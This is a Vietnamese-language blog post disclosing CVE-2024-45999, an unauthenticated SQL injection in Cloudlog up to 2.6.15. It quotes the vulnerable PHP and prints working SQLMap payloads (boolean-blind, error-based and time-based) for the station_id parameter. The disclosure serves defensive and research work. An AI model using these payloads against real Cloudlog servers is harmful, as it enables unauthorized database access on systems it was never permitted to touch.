=== Content from chiggerlor.substack.com_588b6f7a_20250110_114343.html ===

[![](https://substackcdn.com/image/fetch/w_96,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F96c3aaa3-c48d-4e4d-adc0-2b4e3e4ba0c7_144x144.png)](/)
# [Trung’s Substack](/)

SubscribeSign in
#### Share this post

[![](https://substackcdn.com/image/fetch/w_520,h_272,c_fill,f_auto,q_auto:good,fl_progressive:steep,g_auto/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Ff1bf26ea-9bac-472e-81d3-5024b7288338_1237x1063.png)![Trung’s Substack](https://substackcdn.com/image/fetch/w_36,h_36,c_fill,f_auto,q_auto:good,fl_progressive:steep,g_auto/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F96c3aaa3-c48d-4e4d-adc0-2b4e3e4ba0c7_144x144.png)Trung’s SubstackCVE-2024-45999](https://substack.com/home/post/p-149596632?utm_campaign=post&utm_medium=web)Copy linkFacebookEmailNotesMore
# CVE-2024-45999

### Unauthenticated SQL Injection of product Cloudlog (version <= 2.6.15)

[![](https://substackcdn.com/image/fetch/w_36,h_36,c_fill,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F96c3aaa3-c48d-4e4d-adc0-2b4e3e4ba0c7_144x144.png)](https://substack.com/%40chiggerabcd)[Trung](https://substack.com/%40chiggerabcd)Sep 30, 2024
#### Share this post

[![](https://substackcdn.com/image/fetch/w_520,h_272,c_fill,f_auto,q_auto:good,fl_progressive:steep,g_auto/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Ff1bf26ea-9bac-472e-81d3-5024b7288338_1237x1063.png)![Trung’s Substack](https://substackcdn.com/image/fetch/w_36,h_36,c_fill,f_auto,q_auto:good,fl_progressive:steep,g_auto/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F96c3aaa3-c48d-4e4d-adc0-2b4e3e4ba0c7_144x144.png)Trung’s SubstackCVE-2024-45999](https://substack.com/home/post/p-149596632?utm_campaign=post&utm_medium=web)Copy linkFacebookEmailNotesMore[2](https://chiggerlor.substack.com/p/cve-2024-45999/comments)Share
# Lời nói đầu

Mình xin tự giới thiệu mình là **Trung** aka **chigger** . Mình là thành viên trong gia đình [CookieHanHoan](https://www.facebook.com/cookie.han.hoan).

Mình sẽ tiếp tục với hành trình spam nhiều CVE nhất có thể.

# Thông tin lỗ hổng

Bài viết này sẽ sử dụng phương pháp phân tích **Whitebox**, còn được gọi là **Source Code Audit** để phân tích source code và tìm ra lỗ hổng.

CVE-2024-45999:

* Điểm số: 7.3
* Mức độ nguy hiểm: HIGH
* Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L

# Mục tiêu

Cloudlog là một ứng dụng PHP tự lưu trữ cho phép bạn ghi lại các liên hệ vô tuyến nghiệp dư của mình ở bất cứ đâu.

Mã nguồn: [Cloudlog](https://github.com/magicbug/Cloudlog)

Nền tảng này được thiết kế bằng ngôn ngữ PHP và 1 số công nghệ nổi bật:

1. **Codeigniter 3**: Framework PHP cho phát triển ứng dụng web.
2. **Bootstrap 5**: Bộ công cụ giao diện người dùng CSS để thiết kế website.
3. **HTMX**: Được sử dụng để thực hiện các yêu cầu AJAX.
4. **jQuery**: Thư viện JavaScript để hỗ trợ các chức năng giao diện người dùng.
5. **Font Awesome**: Bộ biểu tượng được sử dụng để thêm các icon vào giao diện.

[![](https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Ff1bf26ea-9bac-472e-81d3-5024b7288338_1237x1063.png)](https://substackcdn.com/image/fetch/f_auto%2Cq_auto%3Agood%2Cfl_progressive%3Asteep/https%3A//substack-post-media.s3.amazonaws.com/public/images/f1bf26ea-9bac-472e-81d3-5024b7288338_1237x1063.png)
# Nguyên nhân gốc rễ (root-cause) gây ra lỗ hổng?

ỗ hổng Injection, đặc biệt là SQL Injection, thường xuất phát từ việc ứng dụng không kiểm soát chặt chẽ dữ liệu đầu vào của người dùng, hay còn gọi là dữ liệu không đáng tin cậy (Untrusted Data). Trong nền tảng Cloudlog, nhiều câu truy vấn SQL được viết thủ công dưới dạng raw query.

Ngoài ra, chức năng tồn tại lỗ hổng này không thực hiện xác thực người dùng, dẫn đến lỗ hổng được gọi là Unauthenticated SQL Injection, với điểm CVSS ở mức cao và cực kỳ nguy hiểm.

## CVE-2024-45999

Trong hàm `get_station_info()` tại file `/application/models/Oqrs_model.php`, chúng ta thấy rằng developer sử dụng raw query và thực hiện việc nối chuỗi với tham số `station_id`. Điều này có thể dẫn đến lỗ hổng SQL Injection tiềm ẩn.

```
class Oqrs_model extends CI_Model {
    ...

    function get_station_info($station_id) {
        $station_id = $this->security->xss_clean($station_id);

        $sql = 'select
        count(*) as count,
        min(col_time_on) as mindate,
        max(col_time_on) as maxdate
        from ' . $this->config->item('table_name') . ' where station_id = ' . $station_id;

        $query = $this->db->query($sql);

        return $query->row();
    }
...
}
```

Phân tích mã nguồn cho thấy hàm `get_station_info()` được gọi từ file `/application/controllers/Oqrs.php`. Điều đáng chú ý là giá trị của tham số `station_id` được truyền vào mà không hề kiểm tra hoặc xác thực đầu vào từ người dùng. Hơn nữa, framework CodeIgniter có cung cấp hàm `authorize()` để xác thực và phân quyền người dùng, nhưng đoạn mã này đã bị comment.

```
class Oqrs extends CI_Controller {

	function __construct() {
		parent::__construct();
		$this->lang->load('lotw');
		$this->lang->load('eqsl');
		// Commented out to get public access
		// $this->load->model('user_model');
		// if(!$this->user_model->authorize(2)) { $this->session->set_flashdata('notice', 'You\'re not allowed to do that!'); redirect('dashboard'); }
	}

    .......

	public function get_station_info() {
		$this->load->model('oqrs_model');
		$result = $this->oqrs_model->get_station_info($this->input->post('station_id'));

		header('Content-Type: application/json');
		echo json_encode($result);
	}
......

```

Kết luận: Hàm `get_station_info()` xuất hiện lỗ hổng **Unauthenticated SQL Injection** do không thực hiện việc validate dữ liệu người dùng và thiếu cơ chế xác thực.

# Cách khai thác

Việc thiếu kiểm tra dữ liệu đầu vào khi sử dụng raw query tiềm ẩn nguy cơ **SQL Injection**. Kẻ tấn công có thể lợi dụng ký tự đặc biệt để phá vỡ cú pháp truy vấn và thực thi mã độc hại.

## CVE-2024-45999

Mình thử với kí tự đặc biệt **'**. Quan sát thấy server trả về thông báo **Error syntax** của câu truy vấn. Vậy ở đây ở tham số `station_id` tồn tại lỗ hổng SQL Injection.

[![](https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fdd99b7ee-1159-4d32-80f4-3da27c1a9f50_1549x854.png)](https://substackcdn.com/image/fetch/f_auto%2Cq_auto%3Agood%2Cfl_progressive%3Asteep/https%3A//substack-post-media.s3.amazonaws.com/public/images/dd99b7ee-1159-4d32-80f4-3da27c1a9f50_1549x854.png)

 Mình sử dụng công cụ như **SQLMap** (công cụ tự động hóa quá trình khai thác lỗ hổng SQL Injection). SQLMap có thể tạo ra mã khai thác tùy chỉnh dựa trên phân tích tự động của ứng dụng mục tiêu và cơ sở dữ liệu liên quan.

Mã khai thác:

```
Parameter: #1* ((custom) POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: station_id=1 AND 3912=3912

    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: station_id=1 AND (SELECT 2626 FROM(SELECT COUNT(*),CONCAT(0x7176717671,(SELECT (ELT(2626=2626,1))),0x7170627071,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: station_id=1 AND (SELECT 3981 FROM (SELECT(SLEEP(5)))yhwi)

```
#### Share this post

[![](https://substackcdn.com/image/fetch/w_520,h_272,c_fill,f_auto,q_auto:good,fl_progressive:steep,g_auto/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Ff1bf26ea-9bac-472e-81d3-5024b7288338_1237x1063.png)![Trung’s Substack](https://substackcdn.com/image/fetch/w_36,h_36,c_fill,f_auto,q_auto:good,fl_progressive:steep,g_auto/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F96c3aaa3-c48d-4e4d-adc0-2b4e3e4ba0c7_144x144.png)Trung’s SubstackCVE-2024-45999](https://substack.com/home/post/p-149596632?utm_campaign=post&utm_medium=web)Copy linkFacebookEmailNotesMore[2](https://chiggerlor.substack.com/p/cve-2024-45999/comments)Share
#### Discussion about this post

CommentsRestacks![](https://substackcdn.com/image/fetch/w_32,h_32,c_fill,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack.com%2Fimg%2Favatars%2Fdefault-light.png)[![](https://substackcdn.com/image/fetch/w_32,h_32,c_fill,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Ff97e6fda-00db-483c-8df8-5e1f505a9e02_144x144.png)](https://substack.com/profile/218111684-quan-troc?utm_source=comment)[Quân Trọc](https://substack.com/profile/218111684-quan-troc?utm_source=substack-feed-item)[Oct 3](https://chiggerlor.substack.com/p/cve-2024-45999/comment/71214840 "Oct 3, 2024, 8:30 AM")

xài proc khi truy vấn truyền tham số (parameter) thì tiêm injection giờ không ăn thua nhỉ

Expand full commentReplyShare[1 reply by Trung](https://chiggerlor.substack.com/p/cve-2024-45999/comment/71214840)[1 more comment...](https://chiggerlor.substack.com/p/cve-2024-45999/comments)TopLatestDiscussions

No posts

Ready for more?

Subscribe© 2025 Trung[Privacy](https://substack.com/privacy) ∙ [Terms](https://substack.com/tos) ∙ [Collection notice](https://substack.com/ccpa#personal-data-collected) [Start Writing](https://substack.com/signup?utm_source=substack&utm_medium=web&utm_content=footer)[Get the app](https://substack.com/app/app-store-redirect?utm_campaign=app-marketing&utm_content=web-footer-button)[Substack](https://substack.com) is the home for great culture
#### Share

Copy linkFacebookEmailNotesMore

This site requires JavaScript to run correctly. Please [turn on JavaScript](https://enable-javascript.com/) or unblock scripts


